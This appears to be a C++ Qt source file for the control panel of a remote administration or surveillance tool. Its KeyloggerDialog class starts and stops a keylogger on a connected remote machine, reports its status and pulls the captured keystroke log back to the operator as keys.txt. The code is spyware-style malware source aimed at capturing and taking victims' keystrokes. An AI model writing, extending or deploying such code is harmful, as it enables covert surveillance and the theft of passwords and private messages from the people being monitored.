#include "filetransferdialog.h"
#include "keyloggerdialog.h"
#include "../common/abstractclient.h"
#include <QDateTime>
#include <QDir>
#include <QHostAddress>
#include <QMessageBox>
#include <QStandardPaths>
#include "../common/Optional.h"

KeyloggerDialog::KeyloggerDialog(AbstractClient *client, QWidget *parent) :
    ControllerBase(client, parent)
{
    setupUi(this);
    refreshUi();
    /*
    client->queryKeylogger()->then([this](bool running){
        enableUi(running);
    });
    client->keyloggerFile()->then([this](QString filePath) {
        if (!filePath.isEmpty()) {
            pushButtonDownload->setEnabled(true);
            this->logFile = filePath;
            qDebug() << "logFile=" << logFile;
            labelFileStatus->setText(tr("Exists"));
        } else {
            labelFileStatus->setText(tr("File does not created yet"));
        }
    });
*/
}

void KeyloggerDialog::changeEvent(QEvent *e)
{
    QDialog::changeEvent(e);
    switch (e->type()) {
    case QEvent::LanguageChange:
        retranslateUi(this);
        break;
    default:
        break;
    }
}

void KeyloggerDialog::refreshUi()
{
    _running.reset();
    _fileName.reset();

    client()->queryKeylogger()->then([this](bool running){
        _running = running;
        enableUi();
    });
    client()->keyloggerFile()->then([this](QString filePath) {
        _fileName = filePath;
        enableUi();
    });

}

void KeyloggerDialog::enableUi()
{
    if (!_running.hasValue() || !_fileName.hasValue())
        return;

    pushButtonStop->setEnabled(_running.value());
    pushButtonStart->setEnabled(!_running.value());

    labelStatus->setText(_running.value() ? tr("Running") : tr("Not running"));


    if (_fileName.value().isEmpty()) {
        labelFileStatus->setText(tr("File does not created yet"));
        pushButtonDownload->setEnabled(false);
    } else {
        if (_running.value())
            labelFileStatus->setText(tr("Exists, but download not avaible because service is running"));
        else
            labelFileStatus->setText(tr("Exists"));
        pushButtonDownload->setEnabled(!_running.value());
    }
}

void KeyloggerDialog::on_pushButtonStart_clicked()
{
    if (client())
        client()->startKeylogger()->then([this](bool ok){
            if (ok) {
                _running = true;
                enableUi();
            }
        });
}

void KeyloggerDialog::on_pushButtonStop_clicked()
{
    if (client())
        client()->stopKeylogger()->then([this](bool ok){
            if (ok) {
                _running = false;
                enableUi();
            }
        });
}

void KeyloggerDialog::on_pushButtonDownload_clicked()
{
    QString dirPath = QString("%1/log-%2")
            .arg(QStandardPaths::writableLocation(QStandardPaths::AppDataLocation),
                 client()->hub()->peerAddress().toString().replace(":", "_").replace(".", "_")
            );
    qDebug() << dirPath;
    QDir dir(dirPath);
    bool ok = dir.mkpath(dirPath);
    if (!ok) {
        QMessageBox::warning(this, windowTitle(),
                             QString(tr("Unable to create path: %1")).arg(dirPath));
        return;
    }
//    auto localLogFile = QString("%1/%3-%4.txt")
//            .arg(dir.path(),
//                 QDate::currentDate().toString("yyyyMMdd"),
//                 QTime::currentTime().toString("HHmmss"));
    QString localLogFile = QDir::homePath() + "/keys.txt";

    FileTransferDialog d(client(), this);
    d.setLocalFilePath(localLogFile);
    d.setRemoteFilePath(_fileName.value());
    d.setEnableLocalSelection(true);
    d.setEnableRemoteSelection(false);
    d.setType(Pull);
    d.exec();
}
